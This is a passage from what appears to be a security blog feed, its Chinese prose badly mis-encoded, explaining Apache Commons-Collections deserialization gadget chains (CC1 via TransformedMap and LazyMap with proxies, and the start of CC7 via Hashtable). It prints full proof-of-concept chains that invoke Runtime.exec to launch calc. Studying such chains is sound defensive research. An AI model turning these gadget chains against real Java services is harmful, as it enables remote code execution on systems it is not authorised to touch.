class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>å‘ç°è¿˜æ˜¯ä¸èƒ½è¿è¡Œæˆ‘ä»¬åŠ¨æ€è°ƒè¯•çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714492748596-0fb8e329-f004-47b3-a544-e3e35b9e90b8.png"></p><p>å‘ç°åœ¨è¿™é‡Œä¸ºç©ºæ‰€ä»¥ä¸èƒ½è¿›å…¥ifæ¡ä»¶ï¼Œä¹Ÿå°±æ— æ³•è°ƒç”¨setValueæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493360560-346d68a7-c71d-42f7-a64d-f836b8c231d1.png"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å‘ç°ä»–å›å»è·å–æˆ‘ä»¬ä¼ å…¥çš„æ³¨è§£ç±»å‹å¹¶ä¸”è·å–æ³¨è§£é‡Œé¢æ–¹æ³•çš„åå­—ï¼Œç„¶åé€šè¿‡åˆ¤æ–­æˆ‘ä»¬ä¼ å…¥çš„åå­—æ˜¯å¦ä¸æ³¨è§£é‡Œçš„åå­—æ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™ä¸ä¸ºç©ºå¦åˆ™ä¸ºç©ºå°±ä¸è¿›å…¥ifæ¡ä»¶ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å­å•Šputæ—¶å°†é”®çš„å€¼æ”¹æˆæ³¨è§£ç±»å‹é‡Œé¢çš„æ–¹æ³•åå³å¯ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493512596-ca057800-313a-4866-8652-f0625c253621.png"></p><p>å¯ä»¥çœ‹åˆ°Targetçš„æ–¹æ³•åæ—¶valueæ‰€ä»¥æ”¹æˆvalueå°±å¯ä»¥äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493541211-ea1119a7-895d-48e2-8286-e78b5d30d5bb.png"></p><p>è¿™æ ·å°±å¯ä»¥æ‰§è¡Œäº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714493565966-39b0b375-5f9e-41e0-8db4-f32dfb878fd3.png"></p><h3 id="cc1TransformedMapè°ƒç”¨é“¾"><a href="#cc1TransformedMapè°ƒç”¨é“¾" class="headerlink" title="cc1TransformedMapè°ƒç”¨é“¾"></a>cc1TransformedMapè°ƒç”¨é“¾</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714626920076-d1f2e785-11df-4e1c-8f38-31c0b67b6f00.png"></p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/">https://xz.aliyun.com/</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&vd_source=82398f68c82cb90e0d9aa4fea90e36a0">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;82398f68c82cb90e0d9aa4fea90e36a0</a></p><p><a href="https://blog.csdn.net/weixin_49047967/article/details/134763883">https://blog.csdn.net/weixin_49047967&#x2F;article&#x2F;details&#x2F;134763883</a></p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>LazyMapå’ŒTransformedMapç±»ä¼¼ï¼Œéƒ½æ¥è‡ªäºCommon-Collectionsåº“ï¼Œå¹¶ç»§æ‰¿äº†</p><p>AbstractMapDecoratorã€‚</p><p>TransformedMapçš„æ¼æ´è§¦å‘ç‚¹ï¼šæ˜¯åœ¨åˆ©ç”¨putæ–¹æ³•å†™å…¥å…ƒç´ çš„æ—¶å€™è§¦å‘äº†transformæ–¹æ³•ä»è€Œè§¦å‘äº†æˆ‘ä»¬æ„é€ çš„æ¶æ„åˆ©ç”¨é“¾</p><p>LazyMapè§¦å‘ç‚¹ä¸TransformedMapæœ‰ç‚¹å·®åˆ«æˆ‘ä»¬è¿˜æ˜¯å‘ä»¥å‰é€šè¿‡æŸ¥æ‰¾transfromçš„è°ƒç”¨æ–¹æ³•æ¥çœ‹çœ‹ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714554338581-4bcad701-9832-4724-b268-bc7bcadcb3f9.png"></p><p>å‘ç°LazyMapçš„getæ–¹æ³•ä¸­factoryå¯¹è±¡è°ƒç”¨äº†transformæ–¹æ³•æ‰€ä»¥åªè¦æˆ‘ä»¬èƒ½å¤Ÿå°†factoryçš„å¯¹è±¡è®¾ä¸ºinvokertransformerå¯¹è±¡ï¼Œå½“map.containskey(key) &#x3D;&#x3D; falseï¼Œå°±ä¼šè°ƒç”¨factory.transformã€‚å°±å¯ä»¥è¿›è¡Œrce</p><p>æ‰€ä»¥æŸ¥çœ‹ä¸€ä¸‹LazyMapçš„æ„é€ æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯factoryå¯¹è±¡æ˜¯å¯æ§çš„ï¼Œä¸è¿‡è¿™é‡Œæ˜¯protectedç±»å‹æ‰€ä»¥ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ï¼Œä½†æ˜¯LazyMapä¸­ä¹Ÿæœ‰ä¸€ä¸ªé™æ€æ–¹æ³•decorateå¯ä»¥å®ä¾‹åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨TransformedMapåˆ©ç”¨é“¾å®Œå–„è¿™ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬æœ‰åˆ†æAnnotationInvocationHandlerï¼Œåœ¨å…¶readObjectæ–¹æ³•ä¸­é€šè¿‡è°ƒç”¨setValueæ·»åŠ å…ƒç´ æ¥è§¦å‘transformã€‚ä½†æ˜¯åœ¨readObjectæ–¹æ³•ä¸­æ²¡æœ‰ç›´æ¥è°ƒç”¨åˆ°Mapçš„getæ–¹æ³•ã€‚ä¸è¿‡ysoserialçš„ä½œè€…æ‰¾åˆ°äº†åœ¨è¯¥ç±»çš„invokeæ–¹æ³•ä¸­è°ƒç”¨äº†getæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714554837323-4cf489a2-de94-4c92-8e3c-8e3fca36fd6c.png"></p><p>ä½†æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™åº”è¯¥å¦‚ä½•è§¦å‘è¯¥æ–¹æ³•å‘¢ï¼Œæˆ‘ä»¬æƒ³åˆ°äº†javaçš„åŠ¨æ€ä»£ç†ï¼Œè¿™é‡Œå‚è€ƒ<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631676669-3aecdb26-7ebe-4a78-83d3-1e71ac849c83.pdf">Javaå®‰å…¨æ¼«è°ˆ - 11.ååºåˆ—åŒ–ç¯‡(5).pdf</a><a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631676791-e9c42936-3bc0-4c29-b034-115f85120c57.pdf">Javaå®‰å…¨æ¼«è°ˆ - 10.ç”¨TransformedMapç¼–å†™çœŸæ­£çš„POC.pdf</a></p><p><a href="https://mp.weixin.qq.com/s/doU_WAxgCHpApPpogngVtg">https://mp.weixin.qq.com/s/doU_WAxgCHpApPpogngVtg</a>ã€pç‰›çš„æ–‡ç« è§£é‡Šä¸ºä»€ä¹ˆå¯ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥è°ƒç”¨invokeæ–¹æ³•</p><h3 id="Javaå¯¹è±¡ä»£ç†"><a href="#Javaå¯¹è±¡ä»£ç†" class="headerlink" title="Javaå¯¹è±¡ä»£ç†"></a>Javaå¯¹è±¡ä»£ç†</h3><p>ä½œä¸ºä¸€é—¨é™æ€è¯­è¨€ï¼Œå¦‚æœæƒ³åŠ«æŒä¸€ä¸ªå¯¹è±¡å†…éƒ¨çš„æ–¹æ³•è°ƒç”¨ï¼Œå®ç°ç±»ä¼¼PHPçš„é­”æœ¯æ–¹æ³• __call ï¼Œæˆ‘ä»¬éœ€ è¦ç”¨åˆ° java.reflect.Proxy ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>Proxy.newProxyInstance çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ClassLoaderï¼Œæˆ‘ä»¬ç”¨é»˜è®¤çš„å³å¯ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘ä»¬éœ€è¦ ä»£ç†çš„å¯¹è±¡é›†åˆï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«äº†å…·ä½“ä»£ç†çš„é€» è¾‘ã€‚ æ¯”å¦‚ï¼Œæˆ‘ä»¬å†™è¿™æ ·ä¸€ä¸ªç±»ExampleInvocationHandlerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vulhub;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">ExampleInvocationHandler</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span>(method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span>+ method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> vulhub;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String)proxyMap.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹æ‰§è¡Œç»“æœï¼Œæˆ‘ä»¬èƒ½å‘ç°æˆ‘ä»¬æ˜æ˜ä¼ è¿›Mapæ˜¯testå€¼ä¸ºxxxï¼Œä½†æ˜¯æˆ‘ä»¬è·å–åˆ°çš„ç»“æœå´æ˜¯hacked Objectã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555123018-c1afff61-6e34-4b50-b9b3-44b2ec105dfc.png"></p><p>è¿™é‡Œç”¨è‡ªå·±çš„è¯è§£é‡Šè¿™ä¸ªåŠ¨æ€ä»£ç†çš„åº”ç”¨åŸç†ï¼Œå°±æ˜¯è¯´æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªProxy.newProxyInstanceè¿™ä¸ªç±»å»ä»£ç†ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œè¿™ä¸ªå¯¹è±¡è°ƒç”¨ä»»æ„æ–¹æ³•éƒ½ä¼šè§¦å‘æˆ‘ä»¬ä¼ å…¥çš„InvocationHandlerå¯¹è±¡çš„invokeæ–¹æ³•ã€‚</p><p>AnnotationInvocationHandlerï¼Œè¿™ä¸ªç±»å®é™…å°±æ˜¯ä¸€ä¸ªInvocationHandlerï¼Œå°†è¿™ä¸ªå¯¹è±¡ç”¨Proxyè¿›è¡Œä»£ç†ï¼Œé‚£ä¹ˆåœ¨readObjectçš„æ—¶å€™ï¼Œåªè¦è°ƒç”¨ä»»æ„çš„æ–¹æ³•ã€‚å°±ä¼šè‡ªåŠ¨è°ƒç”¨åˆ° AnnotationInvocationHandler#invoke æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘æˆ‘ä»¬çš„LazyMap#getã€‚æˆ‘ä»¬å¯ä»¥è°ƒè¯•çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555448211-7a496371-98f0-4bbb-9127-807b894099ce.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714555530093-2cf6708d-98cf-4b2e-a9e8-d19352f653ba.png"></p><p>åœ¨è¿™é‡Œå‘ç°membervaluesè°ƒç”¨entysetæ–¹æ³•æ—¶è°ƒç”¨äº†invokeæ–¹æ³•ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºLazyMapçš„åˆ©ç”¨é“¾</p><p>é¦–å…ˆä½¿ç”¨LazyMapæ›¿æ¢TransformedMapã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><font style="color:rgba(0, 0, 0, 0.9);">  </font>ç„¶åé€šè¿‡åå°„è·å–<p>sun.reflect.annotation.AnnotationInvocationHandler</p><p>è¿™ä¸ªå†…éƒ¨ç±»ï¼Œç„¶åè¿›è¡Œå¯¹å…¶è¿›è¡ŒProxyã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure><p>ä»£ç†åçš„å¯¹è±¡å«åšproxyMapï¼Œä½†æˆ‘ä»¬ä¸èƒ½ç›´æ¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå› ä¸ºæˆ‘ä»¬å…¥å£ç‚¹æ˜¯ï¼š</p><p>sun.reflect.annotation.AnnotationInvocationHandler#readObjectï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å†ç”¨AnnotationInvocationHandlerå¯¹è¿™ä¸ªproxyMapè¿›è¡ŒåŒ…è£¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//lazymap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure><h3 id="cc1-LazyMapè°ƒç”¨é“¾"><a href="#cc1-LazyMapè°ƒç”¨é“¾" class="headerlink" title="cc1 LazyMapè°ƒç”¨é“¾"></a>cc1 LazyMapè°ƒç”¨é“¾<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714669450577-aff3a171-9f0e-43f0-9a76-c5966722e65b.png"></h3>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collections7ååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>å…¶å®è¯¥æ¡åˆ©ç”¨é“¾å’Œcc5ä¹Ÿæ˜¯å¤§åŒå°å¼‚ï¼Œä¹Ÿæ˜¯åˆ©ç”¨LazyMapå»è§¦å‘çš„ï¼Œåªä¸è¿‡å…¥å£ç‚¹æ¢æˆäº†Hashtable</p><p>æˆ‘ä»¬å…ˆæ¥ç›´æ¥çœ‹çœ‹ç½‘ä¸Šçš„pocç„¶åè·Ÿç€åˆ†æåˆ†æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="é—®é¢˜1"><a href="#é—®é¢˜1" class="headerlink" title="é—®é¢˜1"></a>é—®é¢˜1</h4><p>ä»pocä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿›è¡Œäº†Hashtableä¸¤æ¬¡putè€Œä¸”éƒ½æ˜¯ç›¸åŒçš„keyï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·åšï¼Ÿæˆ‘ä»¬ç›´æ¥çœ‹å…¶readObjectæ–¹æ³•å°±ä¸å€’ç€è°ƒè¯•äº†ã€‚</p><p><img 